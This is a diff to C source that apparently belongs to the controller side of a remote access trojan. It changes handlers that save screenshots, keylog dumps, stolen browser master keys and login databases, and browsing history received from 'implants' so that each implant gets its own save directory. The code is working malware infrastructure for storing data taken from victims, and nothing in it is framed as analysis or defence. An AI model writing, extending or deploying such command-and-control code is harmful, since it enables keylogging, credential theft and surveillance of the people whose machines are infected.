@@ -3,13 +3,22 @@
 #include <stdlib.h>
 #include <time.h>
 #include <string.h>
+#include <sys/stat.h>
+#include <errno.h>
 
-void handle_screenshot_response(Packet *resp)
+/* Create the per-implant save directory if it does not already exist. */
+void ensure_save_dir(const char *save_dir)
+{
+    if (mkdir(save_dir, 0755) != 0 && errno != EEXIST)
+        fprintf(stderr, "[exfil] could not create %s\n", save_dir);
+}
+
+void handle_screenshot_response(Packet *resp, const char *save_dir)
 {
     if (!resp || resp->command_type != COMMAND_RESPONSE) return;
 
-    char filename[64];
-    snprintf(filename, sizeof(filename), "exfil-data/screenshot_%ld.bmp", time(NULL));
+    char filename[512];
+    snprintf(filename, sizeof(filename), "%s/screenshot_%ld.bmp", save_dir, time(NULL));
     FILE *fp = fopen(filename, "wb");
     if (fp) {
         fwrite(resp->payload, 1, resp->payload_len, fp);
@@ -20,12 +29,12 @@ void handle_screenshot_response(Packet *resp)
     }
 }
 
-void handle_keylog_dump_response(Packet *resp)
+void handle_keylog_dump_response(Packet *resp, const char *save_dir)
 {
     if (!resp || resp->command_type != COMMAND_RESPONSE) return;
 
-    char filename[64];
-    snprintf(filename, sizeof(filename), "exfil-data/keylog_%ld.txt", time(NULL));
+    char filename[512];
+    snprintf(filename, sizeof(filename), "%s/keylog_%ld.txt", save_dir, time(NULL));
     FILE *fp = fopen(filename, "w");
     if (fp) {
         fwrite(resp->payload, 1, resp->payload_len, fp);
@@ -36,7 +45,7 @@ void handle_keylog_dump_response(Packet *resp)
     }
 }
 
-void handle_cred_steal_response(Packet *resp)
+void handle_cred_steal_response(Packet *resp, const char *save_dir)
 {
     if (!resp || resp->command_type != COMMAND_RESPONSE || resp->payload_len < 4) return;
 
@@ -67,9 +76,9 @@ void handle_cred_steal_response(Packet *resp)
         char *db = p;
         p += db_len; remaining -= db_len;
 
-        char key_file[128], db_file[128];
-        snprintf(key_file, sizeof(key_file), "exfil-data/%s_master_%ld.key", name, ts);
-        snprintf(db_file,  sizeof(db_file),  "exfil-data/%s_LoginData_%ld.db",  name, ts);
+        char key_file[512], db_file[512];
+        snprintf(key_file, sizeof(key_file), "%s/%s_master_%ld.key", save_dir, name, ts);
+        snprintf(db_file,  sizeof(db_file),  "%s/%s_LoginData_%ld.db",  save_dir, name, ts);
 
         FILE *fk = fopen(key_file, "wb");
         if (fk) {
@@ -88,7 +97,7 @@ void handle_cred_steal_response(Packet *resp)
     printf("\n");
 }
 
-void handle_history_steal_response(Packet *resp)
+void handle_history_steal_response(Packet *resp, const char *save_dir)
 {
     if (!resp || resp->command_type != COMMAND_RESPONSE || resp->payload_len < 4) return;
 
@@ -115,8 +124,8 @@ void handle_history_steal_response(Packet *resp)
         char *db = p;
         p += db_len; remaining -= db_len;
 
-        char db_file[128];
-        snprintf(db_file,  sizeof(db_file),  "exfil-data/%s_History_%ld.db",  name, ts);
+        char db_file[512];
+        snprintf(db_file,  sizeof(db_file),  "%s/%s_History_%ld.db",  save_dir, name, ts);
 
         FILE *fd = fopen(db_file, "wb");
         if (fd) {
